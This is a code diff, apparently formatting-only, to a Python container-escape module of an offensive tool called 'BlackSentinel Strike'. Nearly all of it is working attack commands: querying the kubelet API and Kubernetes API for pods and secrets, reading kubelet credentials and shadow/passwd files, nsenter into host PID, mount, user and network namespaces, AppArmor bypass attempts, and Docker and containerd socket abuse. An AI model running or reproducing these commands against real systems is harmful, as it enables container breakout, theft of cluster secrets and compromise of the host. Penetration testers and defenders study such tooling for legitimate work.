@@ -1177,22 +1029,17 @@ class ContainerEscape:
 
             output_parts.append("[*] Checking for node IP...")
             node_ip = self.run_command(
-                "curl -sk https://127.0.0.1:10250/hostname 2>/dev/null || "
-                "echo $KUBERNETES_SERVICE_HOST 2>/dev/null"
+                "curl -sk https://127.0.0.1:10250/hostname 2>/dev/null || echo $KUBERNETES_SERVICE_HOST 2>/dev/null"
             )
             output_parts.append(f"[*] Node IP: {node_ip}")
 
             output_parts.append("[*] Checking kubelet API for node info...")
-            kubelet_info = self.run_command(
-                "curl -sk https://127.0.0.1:10250/pods 2>/dev/null | head -100",
-                timeout=15
-            )
+            kubelet_info = self.run_command("curl -sk https://127.0.0.1:10250/pods 2>/dev/null | head -100", timeout=15)
             output_parts.append(f"[*] Kubelet pods: {kubelet_info[:500]}")
 
             output_parts.append("[*] Checking for kubelet credentials...")
             kubelet_creds = self.run_command(
-                "cat /var/lib/kubelet/config.yaml 2>/dev/null | head -20 || "
-                "echo 'kubelet_config_not_found'"
+                "cat /var/lib/kubelet/config.yaml 2>/dev/null | head -20 || echo 'kubelet_config_not_found'"
             )
             output_parts.append(f"[*] Kubelet config:\n{kubelet_creds}")
 
@@ -1210,36 +1057,32 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking API server accessibility...")
-            api_check = self.run_command(
-                "curl -sk https://kubernetes.default.svc:443/version 2>/dev/null"
-            )
+            api_check = self.run_command("curl -sk https://kubernetes.default.svc:443/version 2>/dev/null")
             output_parts.append(f"[*] API version:\n{api_check}")
 
             output_parts.append("[*] Checking for anonymous auth...")
             anon_check = self.run_command(
-                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces 2>/dev/null | head -5",
-                timeout=15
+                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces 2>/dev/null | head -5", timeout=15
             )
             output_parts.append(f"[*] Anonymous access:\n{anon_check}")
 
             output_parts.append("[*] Listing namespaces...")
             namespaces = self.run_command(
-                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces 2>/dev/null | head -20",
-                timeout=15
+                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces 2>/dev/null | head -20", timeout=15
             )
             output_parts.append(f"[*] Namespaces:\n{namespaces}")
 
             output_parts.append("[*] Checking for RBAC bypass...")
             rbac_check = self.run_command(
                 "curl -sk https://kubernetes.default.svc:443/apis/rbac.authorization.k8s.io/v1/clusterroles 2>/dev/null | head -10",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] Cluster roles:\n{rbac_check}")
 
             output_parts.append("[*] Checking for exposed secrets...")
             secrets = self.run_command(
                 "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces/default/secrets 2>/dev/null | head -20",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] Default secrets:\n{secrets}")
 
@@ -1257,36 +1100,29 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking kubelet API access...")
-            kubelet_health = self.run_command(
-                "curl -sk https://127.0.0.1:10250/healthz 2>/dev/null"
-            )
+            kubelet_health = self.run_command("curl -sk https://127.0.0.1:10250/healthz 2>/dev/null")
             output_parts.append(f"[*] Kubelet health: {kubelet_health}")
 
             output_parts.append("[*] Checking kubelet endpoints...")
-            kubelet_pods = self.run_command(
-                "curl -sk https://127.0.0.1:10250/pods 2>/dev/null | head -100",
-                timeout=15
-            )
+            kubelet_pods = self.run_command("curl -sk https://127.0.0.1:10250/pods 2>/dev/null | head -100", timeout=15)
             output_parts.append(f"[*] Kubelet pods:\n{kubelet_pods[:500]}")
 
             output_parts.append("[*] Checking kubelet stats...")
             kubelet_stats = self.run_command(
-                "curl -sk https://127.0.0.1:10250/stats/summary 2>/dev/null | head -50",
-                timeout=15
+                "curl -sk https://127.0.0.1:10250/stats/summary 2>/dev/null | head -50", timeout=15
             )
             output_parts.append(f"[*] Kubelet stats:\n{kubelet_stats[:500]}")
 
             output_parts.append("[*] Checking kubelet logs endpoint...")
             kubelet_logs = self.run_command(
                 "curl -sk https://127.0.0.1:10250/containerLogs/default/pod-name/container 2>/dev/null | head -20",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] Kubelet logs: {kubelet_logs}")
 
             output_parts.append("[*] Checking kubelet exec endpoint...")
             kubelet_exec = self.run_command(
-                "curl -sk https://127.0.0.1:10250/run/namespace/pod/container 2>/dev/null",
-                timeout=15
+                "curl -sk https://127.0.0.1:10250/run/namespace/pod/container 2>/dev/null", timeout=15
             )
             output_parts.append(f"[*] Kubelet exec: {kubelet_exec}")
 
@@ -1304,33 +1140,23 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Locating containerd socket...")
-            sockets = self.run_command(
-                "find /run /var/run -name 'containerd.sock' 2>/dev/null"
-            )
+            sockets = self.run_command("find /run /var/run -name 'containerd.sock' 2>/dev/null")
             output_parts.append(f"[*] Sockets found:\n{sockets}")
 
             output_parts.append("[*] Checking containerd socket access...")
-            socket_check = self.run_command(
-                "ls -la /run/containerd/containerd.sock 2>/dev/null"
-            )
+            socket_check = self.run_command("ls -la /run/containerd/containerd.sock 2>/dev/null")
             output_parts.append(f"[*] Socket access: {socket_check}")
 
             output_parts.append("[*] Listing containerd containers...")
-            containers = self.run_command(
-                "ctr -a /run/containerd/containerd.sock containers ls 2>/dev/null | head -10"
-            )
+            containers = self.run_command("ctr -a /run/containerd/containerd.sock containers ls 2>/dev/null | head -10")
             output_parts.append(f"[*] Containers:\n{containers}")
 
             output_parts.append("[*] Checking containerd namespaces...")
-            namespaces = self.run_command(
-                "ctr -a /run/containerd/containerd.sock namespace ls 2>/dev/null"
-            )
+            namespaces = self.run_command("ctr -a /run/containerd/containerd.sock namespace ls 2>/dev/null")
             output_parts.append(f"[*] Namespaces:\n{namespaces}")
 
             output_parts.append("[*] Checking containerd images...")
-            images = self.run_command(
-                "ctr -a /run/containerd/containerd.sock images ls 2>/dev/null | head -10"
-            )
+            images = self.run_command("ctr -a /run/containerd/containerd.sock images ls 2>/dev/null | head -10")
             output_parts.append(f"[*] Images:\n{images}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1347,33 +1173,23 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking for Docker socket mount...")
-            docker_sock = self.run_command(
-                "ls -la /var/run/docker.sock 2>/dev/null"
-            )
+            docker_sock = self.run_command("ls -la /var/run/docker.sock 2>/dev/null")
             output_parts.append(f"[*] Docker socket: {docker_sock}")
 
             output_parts.append("[*] Testing Docker socket access...")
-            docker_test = self.run_command(
-                "docker version 2>/dev/null | head -10"
-            )
+            docker_test = self.run_command("docker version 2>/dev/null | head -10")
             output_parts.append(f"[*] Docker access:\n{docker_test}")
 
             output_parts.append("[*] Listing Docker containers...")
-            docker_containers = self.run_command(
-                "docker ps 2>/dev/null | head -10"
-            )
+            docker_containers = self.run_command("docker ps 2>/dev/null | head -10")
             output_parts.append(f"[*] Docker containers:\n{docker_containers}")
 
             output_parts.append("[*] Listing Docker images...")
-            docker_images = self.run_command(
-                "docker images 2>/dev/null | head -10"
-            )
+            docker_images = self.run_command("docker images 2>/dev/null | head -10")
             output_parts.append(f"[*] Docker images:\n{docker_images}")
 
             output_parts.append("[*] Checking Docker daemon info...")
-            docker_info = self.run_command(
-                "docker info 2>/dev/null | head -20"
-            )
+            docker_info = self.run_command("docker info 2>/dev/null | head -20")
             output_parts.append(f"[*] Docker info:\n{docker_info}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1390,39 +1206,27 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Enumerating mounted volumes...")
-            volumes = self.run_command(
-                "mount | grep -v 'proc\\|sys\\|dev\\|cgroup' 2>/dev/null"
-            )
+            volumes = self.run_command("mount | grep -v 'proc\\|sys\\|dev\\|cgroup' 2>/dev/null")
             output_parts.append(f"[*] Mounted volumes:\n{volumes}")
 
             output_parts.append("[*] Checking for NFS mounts...")
-            nfs_mounts = self.run_command(
-                "mount | grep nfs 2>/dev/null || echo 'no_nfs'"
-            )
+            nfs_mounts = self.run_command("mount | grep nfs 2>/dev/null || echo 'no_nfs'")
             output_parts.append(f"[*] NFS mounts: {nfs_mounts}")
 
             output_parts.append("[*] Checking for Ceph/RBD mounts...")
-            rbd_mounts = self.run_command(
-                "mount | grep -E 'rbd|ceph' 2>/dev/null || echo 'no_ceph'"
-            )
+            rbd_mounts = self.run_command("mount | grep -E 'rbd|ceph' 2>/dev/null || echo 'no_ceph'")
             output_parts.append(f"[*] Ceph mounts: {rbd_mounts}")
 
             output_parts.append("[*] Checking for ISCSI mounts...")
-            iscsi_mounts = self.run_command(
-                "mount | grep iscsi 2>/dev/null || echo 'no_iscsi'"
-            )
+            iscsi_mounts = self.run_command("mount | grep iscsi 2>/dev/null || echo 'no_iscsi'")
             output_parts.append(f"[*] ISCSI mounts: {iscsi_mounts}")
 
             output_parts.append("[*] Checking for ConfigMap/Secret mounts...")
-            cm_mounts = self.run_command(
-                "ls -la /etc/config/ 2>/dev/null || ls -la /var/run/secrets/ 2>/dev/null"
-            )
+            cm_mounts = self.run_command("ls -la /etc/config/ 2>/dev/null || ls -la /var/run/secrets/ 2>/dev/null")
             output_parts.append(f"[*] Config mounts:\n{cm_mounts}")
 
             output_parts.append("[*] Attempting host access via volume mount...")
-            host_access = self.run_command(
-                "find / -maxdepth 3 -name 'shadow' -o -name 'passwd' 2>/dev/null | head -10"
-            )
+            host_access = self.run_command("find / -maxdepth 3 -name 'shadow' -o -name 'passwd' 2>/dev/null | head -10")
             output_parts.append(f"[*] Sensitive files found:\n{host_access}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1439,21 +1243,15 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking init container status...")
-            init_status = self.run_command(
-                "cat /etc/podinfo/labels 2>/dev/null || echo 'no_pod_info'"
-            )
+            init_status = self.run_command("cat /etc/podinfo/labels 2>/dev/null || echo 'no_pod_info'")
             output_parts.append(f"[*] Pod info: {init_status}")
 
             output_parts.append("[*] Checking for init container artifacts...")
-            init_artifacts = self.run_command(
-                "ls -la /var/lib/kubelet/pods/ 2>/dev/null | head -10"
-            )
+            init_artifacts = self.run_command("ls -la /var/lib/kubelet/pods/ 2>/dev/null | head -10")
             output_parts.append(f"[*] Kubelet pods dir:\n{init_artifacts}")
 
             output_parts.append("[*] Checking for completed init containers...")
-            init_containers = self.run_command(
-                "cat /proc/1/status | grep -i name 2>/dev/null"
-            )
+            init_containers = self.run_command("cat /proc/1/status | grep -i name 2>/dev/null")
             output_parts.append(f"[*] Process name: {init_containers}")
 
             output_parts.append("[*] Checking for volume mounts from init containers...")
@@ -1463,10 +1261,7 @@ class ContainerEscape:
             output_parts.append(f"[*] Volume mounts:\n{vol_mounts}")
 
             output_parts.append("[*] Checking for host PID access via init containers...")
-            host_pid = self.run_command(
-                "nsenter -t 1 -p -- ps aux 2>/dev/null | head -10",
-                timeout=15
-            )
+            host_pid = self.run_command("nsenter -t 1 -p -- ps aux 2>/dev/null | head -10", timeout=15)
             output_parts.append(f"[*] Host PID access: {host_pid}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1483,45 +1278,31 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Analyzing security context...")
-            security_context = self.run_command(
-                "cat /proc/1/status | grep -i cap 2>/dev/null"
-            )
+            security_context = self.run_command("cat /proc/1/status | grep -i cap 2>/dev/null")
             output_parts.append(f"[*] Security context:\n{security_context}")
 
             output_parts.append("[*] Checking for privilege escalation...")
-            cap_eff = self.run_command(
-                "grep CapEff /proc/1/status | awk '{print $2}'"
-            )
+            cap_eff = self.run_command("grep CapEff /proc/1/status | awk '{print $2}'")
             output_parts.append(f"[*] Effective capabilities: {cap_eff}")
 
             output_parts.append("[*] Checking SELinux status...")
-            selinux = self.run_command(
-                "getenforce 2>/dev/null || echo 'SELinux_not_available'"
-            )
+            selinux = self.run_command("getenforce 2>/dev/null || echo 'SELinux_not_available'")
             output_parts.append(f"[*] SELinux: {selinux}")
 
             output_parts.append("[*] Checking AppArmor status...")
-            apparmor = self.run_command(
-                "cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor_not_available'"
-            )
+            apparmor = self.run_command("cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor_not_available'")
             output_parts.append(f"[*] AppArmor: {apparmor}")
 
             output_parts.append("[*] Checking seccomp profile...")
-            seccomp = self.run_command(
-                "cat /proc/1/status | grep Seccomp 2>/dev/null"
-            )
+            seccomp = self.run_command("cat /proc/1/status | grep Seccomp 2>/dev/null")
             output_parts.append(f"[*] Seccomp: {seccomp}")
 
             output_parts.append("[*] Checking for privilege escalation vectors...")
-            privesc = self.run_command(
-                "find / -perm -4000 -type f 2>/dev/null | head -10"
-            )
+            privesc = self.run_command("find / -perm -4000 -type f 2>/dev/null | head -10")
             output_parts.append(f"[*] SUID binaries:\n{privesc}")
 
             output_parts.append("[*] Checking for writable sensitive paths...")
-            writable = self.run_command(
-                "find /etc -writable -type f 2>/dev/null | head -10"
-            )
+            writable = self.run_command("find /etc -writable -type f 2>/dev/null | head -10")
             output_parts.append(f"[*] Writable /etc files:\n{writable}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1542,15 +1323,11 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Enumerating namespaces...")
-            namespaces = self.run_command(
-                "ls -la /proc/1/ns/ 2>/dev/null"
-            )
+            namespaces = self.run_command("ls -la /proc/1/ns/ 2>/dev/null")
             output_parts.append(f"[*] Available namespaces:\n{namespaces}")
 
             output_parts.append("[*] Checking namespace isolation levels...")
-            ns_info = self.run_command(
-                "readlink /proc/1/ns/* 2>/dev/null"
-            )
+            ns_info = self.run_command("readlink /proc/1/ns/* 2>/dev/null")
             output_parts.append(f"[*] Namespace links:\n{ns_info}")
 
             output_parts.append("[*] Attempting namespace escape via unshare...")
@@ -1561,15 +1338,12 @@ class ContainerEscape:
             output_parts.append(f"[*] Unshare result: {unshare_result}")
 
             output_parts.append("[*] Checking for namespace leaks...")
-            ns_leak = self.run_command(
-                "ls -la /proc/*/ns/ 2>/dev/null | head -20"
-            )
+            ns_leak = self.run_command("ls -la /proc/*/ns/ 2>/dev/null | head -20")
             output_parts.append(f"[*] Namespace leaks:\n{ns_leak}")
 
             output_parts.append("[*] Attempting namespace escape via setns...")
             setns_result = self.run_command(
-                "nsenter --all --target 1 -- sh -c 'echo setns_success; id' 2>/dev/null || "
-                "echo 'setns_failed'"
+                "nsenter --all --target 1 -- sh -c 'echo setns_success; id' 2>/dev/null || echo 'setns_failed'"
             )
             output_parts.append(f"[*] Setns result: {setns_result}")
 
@@ -1587,15 +1361,11 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Analyzing current capabilities...")
-            caps = self.run_command(
-                "cat /proc/1/status | grep Cap"
-            )
+            caps = self.run_command("cat /proc/1/status | grep Cap")
             output_parts.append(f"[*] Capabilities:\n{caps}")
 
             output_parts.append("[*] Decoding capability bits...")
-            cap_hex = self.run_command(
-                "grep CapEff /proc/1/status | awk '{print $2}'"
-            )
+            cap_hex = self.run_command("grep CapEff /proc/1/status | awk '{print $2}'")
             output_parts.append(f"[*] CapEff hex: {cap_hex}")
 
             if cap_hex and cap_hex != "0000000000000000":
@@ -1616,15 +1386,12 @@ class ContainerEscape:
 
             output_parts.append("[*] Testing capability-based escape...")
             cap_test = self.run_command(
-                "mount -t tmpfs tmpfs /tmp/cap_test 2>/dev/null && echo 'cap_mount_works' || "
-                "echo 'cap_mount_failed'"
+                "mount -t tmpfs tmpfs /tmp/cap_test 2>/dev/null && echo 'cap_mount_works' || echo 'cap_mount_failed'"
             )
             output_parts.append(f"[*] Capability mount test: {cap_test}")
 
             output_parts.append("[*] Checking for capability inheritance...")
-            inherit = self.run_command(
-                "grep CapBnd /proc/1/status | awk '{print $2}'"
-            )
+            inherit = self.run_command("grep CapBnd /proc/1/status | awk '{print $2}'")
             output_parts.append(f"[*] Bounding capabilities: {inherit}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1641,15 +1408,11 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking seccomp status...")
-            seccomp_status = self.run_command(
-                "cat /proc/1/status | grep Seccomp"
-            )
+            seccomp_status = self.run_command("cat /proc/1/status | grep Seccomp")
             output_parts.append(f"[*] Seccomp status: {seccomp_status}")
 
             output_parts.append("[*] Checking seccomp mode...")
-            seccomp_mode = self.run_command(
-                "cat /proc/self/status | grep Seccomp"
-            )
+            seccomp_mode = self.run_command("cat /proc/self/status | grep Seccomp")
             output_parts.append(f"[*] Self seccomp: {seccomp_mode}")
 
             output_parts.append("[*] Testing blocked syscalls...")
@@ -1668,15 +1431,12 @@ class ContainerEscape:
                 output_parts.append(f"[*] {name}: {'blocked' if name in blocked_syscalls else 'allowed'}")
 
             output_parts.append("[*] Checking seccomp filter count...")
-            filter_count = self.run_command(
-                "cat /proc/self/status | grep -c Seccomp 2>/dev/null"
-            )
+            filter_count = self.run_command("cat /proc/self/status | grep -c Seccomp 2>/dev/null")
             output_parts.append(f"[*] Seccomp filters: {filter_count}")
 
             output_parts.append("[*] Attempting seccomp bypass via ptrace...")
             ptrace_bypass = self.run_command(
-                "strace -e trace=none ls / 2>/dev/null && echo 'ptrace_works' || echo 'ptrace_blocked'",
-                timeout=10
+                "strace -e trace=none ls / 2>/dev/null && echo 'ptrace_works' || echo 'ptrace_blocked'", timeout=10
             )
             output_parts.append(f"[*] Ptrace bypass: {ptrace_bypass}")
 
@@ -1694,22 +1454,17 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking AppArmor status...")
-            apparmor_status = self.run_command(
-                "cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor_not_available'"
-            )
+            apparmor_status = self.run_command("cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor_not_available'")
             output_parts.append(f"[*] AppArmor profile: {apparmor_status}")
 
             output_parts.append("[*] Checking AppArmor enforcement...")
             enforcement = self.run_command(
-                "cat /sys/module/apparmor/parameters/enabled 2>/dev/null || "
-                "echo 'apparmor_not_loaded'"
+                "cat /sys/module/apparmor/parameters/enabled 2>/dev/null || echo 'apparmor_not_loaded'"
             )
             output_parts.append(f"[*] Enforcement: {enforcement}")
 
             output_parts.append("[*] Checking for unconfined processes...")
-            unconfined = self.run_command(
-                "cat /proc/*/attr/current 2>/dev/null | grep unconfined | head -5"
-            )
+            unconfined = self.run_command("cat /proc/*/attr/current 2>/dev/null | grep unconfined | head -5")
             output_parts.append(f"[*] Unconfined processes: {unconfined}")
 
             output_parts.append("[*] Testing AppArmor restrictions...")
@@ -1727,8 +1482,7 @@ class ContainerEscape:
 
             output_parts.append("[*] Checking for AppArmor profile bypass...")
             profile_bypass = self.run_command(
-                "echo 'unconfined' > /proc/self/attr/current 2>/dev/null && echo 'bypass_works' || "
-                "echo 'bypass_failed'"
+                "echo 'unconfined' > /proc/self/attr/current 2>/dev/null && echo 'bypass_works' || echo 'bypass_failed'"
             )
             output_parts.append(f"[*] Profile bypass: {profile_bypass}")
 
@@ -1746,21 +1500,16 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking SELinux status...")
-            selinux_status = self.run_command(
-                "getenforce 2>/dev/null || echo 'SELinux_not_available'"
-            )
+            selinux_status = self.run_command("getenforce 2>/dev/null || echo 'SELinux_not_available'")
             output_parts.append(f"[*] SELinux status: {selinux_status}")
 
             output_parts.append("[*] Checking SELinux context...")
-            selinux_context = self.run_command(
-                "ls -Z / 2>/dev/null | head -10 || echo 'context_not_available'"
-            )
+            selinux_context = self.run_command("ls -Z / 2>/dev/null | head -10 || echo 'context_not_available'")
             output_parts.append(f"[*] SELinux context:\n{selinux_context}")
 
             output_parts.append("[*] Checking SELinux policy...")
             selinux_policy = self.run_command(
-                "semanage boolean -l 2>/dev/null | head -10 || "
-                "cat /etc/selinux/config 2>/dev/null"
+                "semanage boolean -l 2>/dev/null | head -10 || cat /etc/selinux/config 2>/dev/null"
             )
             output_parts.append(f"[*] SELinux policy:\n{selinux_policy}")
 
@@ -1774,15 +1523,11 @@ class ContainerEscape:
                 output_parts.append(f"[*] {f}: {check}")
 
             output_parts.append("[*] Checking for SELinux bypass via procfs...")
-            procfs_bypass = self.run_command(
-                "cat /proc/1/attr/current 2>/dev/null"
-            )
+            procfs_bypass = self.run_command("cat /proc/1/attr/current 2>/dev/null")
             output_parts.append(f"[*] SELinux procfs: {procfs_bypass}")
 
             output_parts.append("[*] Checking SELinux booleans...")
-            booleans = self.run_command(
-                "getsebool -a 2>/dev/null | head -20 || echo 'getsebool_not_available'"
-            )
+            booleans = self.run_command("getsebool -a 2>/dev/null | head -20 || echo 'getsebool_not_available'")
             output_parts.append(f"[*] SELinux booleans:\n{booleans}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1810,22 +1555,18 @@ class ContainerEscape:
             output_parts.append(f"[*] GID map: {gid_map}")
 
             output_parts.append("[*] Checking for user namespace creation capability...")
-            unshare_test = self.run_command(
-                "unshare -U id 2>/dev/null || echo 'user_namespace_not_allowed'"
-            )
+            unshare_test = self.run_command("unshare -U id 2>/dev/null || echo 'user_namespace_not_allowed'")
             output_parts.append(f"[*] User namespace unshare: {unshare_test}")
 
             output_parts.append("[*] Checking /proc/setgroups access...")
-            setgroups = self.run_command(
-                "cat /proc/1/setgroups 2>/dev/null || echo 'setgroups_not_readable'"
-            )
+            setgroups = self.run_command("cat /proc/1/setgroups 2>/dev/null || echo 'setgroups_not_readable'")
             output_parts.append(f"[*] Setgroups: {setgroups}")
 
             output_parts.append("[*] Attempting user namespace escape...")
             ns_escape = self.run_command(
                 "nsenter -t 1 -U -- sh -c 'echo user_ns_escape_success; id' 2>/dev/null || "
                 "echo 'user_ns_escape_failed'",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] User namespace escape: {ns_escape}")
 
@@ -1851,35 +1592,27 @@ class ContainerEscape:
             output_parts.append(f"[*] PID namespace: {pid_ns}")
 
             output_parts.append("[*] Counting visible processes...")
-            visible_pids = self.run_command(
-                "ls /proc/ | grep -E '^[0-9]+$' | wc -l"
-            )
+            visible_pids = self.run_command("ls /proc/ | grep -E '^[0-9]+$' | wc -l")
             output_parts.append(f"[*] Visible PIDs: {visible_pids}")
 
             output_parts.append("[*] Checking PID namespace level...")
-            ns_level = self.run_command(
-                "cat /proc/1/ns/pid 2>/dev/null"
-            )
+            ns_level = self.run_command("cat /proc/1/ns/pid 2>/dev/null")
             output_parts.append(f"[*] PID namespace: {ns_level}")
 
             output_parts.append("[*] Attempting PID namespace escape...")
             pid_escape = self.run_command(
                 "nsenter -t 1 -p -- sh -c 'echo pid_ns_escape_success; ps aux | head -5' 2>/dev/null || "
                 "echo 'pid_ns_escape_failed'",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] PID namespace escape: {pid_escape}")
 
             output_parts.append("[*] Checking for host PID visibility...")
-            host_pids = self.run_command(
-                "ls /proc/ | grep -E '^[0-9]+$' | sort -n | tail -10"
-            )
+            host_pids = self.run_command("ls /proc/ | grep -E '^[0-9]+$' | sort -n | tail -10")
             output_parts.append(f"[*] Host PIDs visible:\n{host_pids}")
 
             output_parts.append("[*] Checking for init process access...")
-            init_access = self.run_command(
-                "cat /proc/1/status 2>/dev/null | head -20"
-            )
+            init_access = self.run_command("cat /proc/1/status 2>/dev/null | head -20")
             output_parts.append(f"[*] Init process status:\n{init_access}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1913,20 +1646,16 @@ class ContainerEscape:
             mount_escape = self.run_command(
                 "nsenter -t 1 -m -- sh -c 'echo mount_ns_escape_success; mount | head -10' 2>/dev/null || "
                 "echo 'mount_ns_escape_failed'",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] Mount namespace escape: {mount_escape}")
 
             output_parts.append("[*] Checking for writable mount points...")
-            writable_mounts = self.run_command(
-                "cat /proc/1/mountinfo 2>/dev/null | grep 'rw,' | head -10"
-            )
+            writable_mounts = self.run_command("cat /proc/1/mountinfo 2>/dev/null | grep 'rw,' | head -10")
             output_parts.append(f"[*] Writable mounts:\n{writable_mounts}")
 
             output_parts.append("[*] Checking for tmpfs mounts...")
-            tmpfs = self.run_command(
-                "mount | grep tmpfs 2>/dev/null | head -10"
-            )
+            tmpfs = self.run_command("mount | grep tmpfs 2>/dev/null | head -10")
             output_parts.append(f"[*] Tmpfs mounts:\n{tmpfs}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1947,34 +1676,24 @@ class ContainerEscape:
             output_parts.append(f"[*] Network namespace: {net_ns}")
 
             output_parts.append("[*] Listing network interfaces...")
-            interfaces = self.run_command(
-                "ip link show 2>/dev/null || ifconfig 2>/dev/null | head -30"
-            )
+            interfaces = self.run_command("ip link show 2>/dev/null || ifconfig 2>/dev/null | head -30")
             output_parts.append(f"[*] Interfaces:\n{interfaces}")
 
             output_parts.append("[*] Checking network configuration...")
-            net_config = self.run_command(
-                "ip addr show 2>/dev/null | head -40"
-            )
+            net_config = self.run_command("ip addr show 2>/dev/null | head -40")
             output_parts.append(f"[*] Network config:\n{net_config}")
 
             output_parts.append("[*] Checking routing table...")
-            routes = self.run_command(
-                "ip route show 2>/dev/null || route -n 2>/dev/null | head -15"
-            )
+            routes = self.run_command("ip route show 2>/dev/null || route -n 2>/dev/null | head -15")
             output_parts.append(f"[*] Routes:\n{routes}")
 
             output_parts.append("[*] Checking for DNS resolution...")
-            dns = self.run_command(
-                "cat /etc/resolv.conf 2>/dev/null"
-            )
+            dns = self.run_command("cat /etc/resolv.conf 2>/dev/null")
             output_parts.append(f"[*] DNS config:\n{dns}")
 
             output_parts.append("[*] Checking for network namespace escape...")
             net_escape = self.run_command(
-                "nsenter -t 1 -n -- ip addr show 2>/dev/null | head -20 || "
-                "echo 'network_ns_escape_failed'",
-                timeout=15
+                "nsenter -t 1 -n -- ip addr show 2>/dev/null | head -20 || echo 'network_ns_escape_failed'", timeout=15
             )
             output_parts.append(f"[*] Network namespace escape:\n{net_escape}")
 
@@ -2012,28 +1731,19 @@ class ContainerEscape:
             output_parts.append(f"[*] CPU limit: {cpu_limits}")
 
             output_parts.append("[*] Checking PID limits...")
-            pid_limits = self.run_command(
-                "cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || "
-                "echo 'pid_limits_not_found'"
-            )
+            pid_limits = self.run_command("cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || echo 'pid_limits_not_found'")
             output_parts.append(f"[*] PID limit: {pid_limits}")
 
             output_parts.append("[*] Checking for fork bomb protection...")
-            fork_test = self.run_command(
-                "bash -c 'ulimit -u 2>/dev/null || echo ulimit_unlimited'"
-            )
+            fork_test = self.run_command("bash -c 'ulimit -u 2>/dev/null || echo ulimit_unlimited'")
             output_parts.append(f"[*] Process limit: {fork_test}")
 
             output_parts.append("[*] Attempting resource limit bypass...")
-            bypass = self.run_command(
-                "cat /proc/self/cgroup 2>/dev/null | head -10"
-            )
+            bypass = self.run_command("cat /proc/self/cgroup 2>/dev/null | head -10")
             output_parts.append(f"[*] Cgroup membership:\n{bypass}")
 
             output_parts.append("[*] Checking for cgroup escape...")
-            cgroup_escape = self.run_command(
-                "ls -la /sys/fs/cgroup/ 2>/dev/null | head -15"
-            )
+            cgroup_escape = self.run_command("ls -la /sys/fs/cgroup/ 2>/dev/null | head -15")
             output_parts.append(f"[*] Cgroup filesystem:\n{cgroup_escape}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -2076,13 +1786,13 @@ class ContainerEscape:
             ]
 
             for method_name in docker_methods:
-                output_parts.append(f"\n{'='*60}")
+                output_parts.append(f"\n{'=' * 60}")
                 output_parts.append(f"[*] Running {method_name}...")
                 method = getattr(self, method_name)
                 result = method()
                 output_parts.append(result)
 
-            output_parts.append(f"\n{'='*60}")
+            output_parts.append(f"\n{'=' * 60}")
             output_parts.append(f"[*] Completed {len(docker_methods)} Docker escape techniques")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -2121,13 +1831,13 @@ class ContainerEscape:
             ]
 
             for method_name in k8s_methods:
-                output_parts.append(f"\n{'='*60}")
+                output_parts.append(f"\n{'=' * 60}")
                 output_parts.append(f"[*] Running {method_name}...")
                 method = getattr(self, method_name)
                 result = method()
                 output_parts.append(result)
 
-            output_parts.append(f"\n{'='*60}")
+            output_parts.append(f"\n{'=' * 60}")
             output_parts.append(f"[*] Completed {len(k8s_methods)} Kubernetes escape techniques")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -2160,13 +1870,13 @@ class ContainerEscape:
             ]
 
             for method_name in breakout_methods:
-                output_parts.append(f"\n{'='*60}")
+                output_parts.append(f"\n{'=' * 60}")
                 output_parts.append(f"[*] Running {method_name}...")
                 method = getattr(self, method_name)
                 result = method()
                 output_parts.append(result)
 
-            output_parts.append(f"\n{'='*60}")
+            output_parts.append(f"\n{'=' * 60}")
             output_parts.append(f"[*] Completed {len(breakout_methods)} container breakout techniques")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -2191,10 +1901,7 @@ class ContainerEscape:
 
         output_parts.append("\nTechniques executed:")
         for i, tech in enumerate(self.techniques_executed, 1):
-            status = "[SUCCESS]" if any(
-                r["technique"] == tech and r["success"]
-                for r in self.results
-            ) else "[FAILED]"
+            status = "[SUCCESS]" if any(r["technique"] == tech and r["success"] for r in self.results) else "[FAILED]"
             output_parts.append(f"  {i}. {tech} {status}")
 
         output_parts.append("\n" + "=" * 60)
@@ -2220,38 +1927,15 @@ class ContainerEscape:
 if __name__ == "__main__":
     import argparse
 
-    parser = argparse.ArgumentParser(
-        description="BlackSentinel Strike - Container Escape Module"
-    )
